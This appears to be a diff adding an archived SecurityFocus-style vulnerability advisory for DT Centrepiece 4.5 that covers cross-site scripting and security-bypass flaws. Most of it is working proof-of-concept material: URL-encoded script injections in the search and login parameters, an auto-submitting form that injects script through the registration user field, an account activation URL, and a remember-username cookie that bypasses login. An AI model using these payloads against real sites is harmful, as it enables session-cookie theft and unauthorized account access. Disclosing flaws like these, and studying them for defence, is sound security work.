@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/42243/info
+
+DT Centrepiece is prone to multiple cross-site scripting vulnerabilities and multiple security-bypass vulnerabilities.
+
+An attacker may leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+The attacker may leverage the security bypass issues to activate arbitrary accounts and gain unauthorized access to the affected application.
+
+DT Centrepiece 4.5 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/search.asp?searchFor=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+http://www.example.com/login.asp?c=/%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+<form name="main" method="POST" action="http://www.example.com/register.asp">
+<input type="hidden" name="frmRegisterCheck" value="true">
+<input type="hidden" name="user" value='"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="pass" value="">
+<input type="hidden" name="confirmPass" value="">
+<input type="hidden" name="FirstName" value="">
+<input type="hidden" name="LastName" value="">
+<input type="hidden" name="EmailAddress" value="">
+<input type="hidden" name="Address" value="">
+<input type="hidden" name="Country" value="">
+<input type="hidden" name="Landline" value="">
+<input type="hidden" name="Mobile" value="">
+</form>
+<script>
+document.main.submit();
+</script>
+
+http://www.example.com/activate.asp?p=USERNAME
+
+MM_Remember_Username=USERNAME
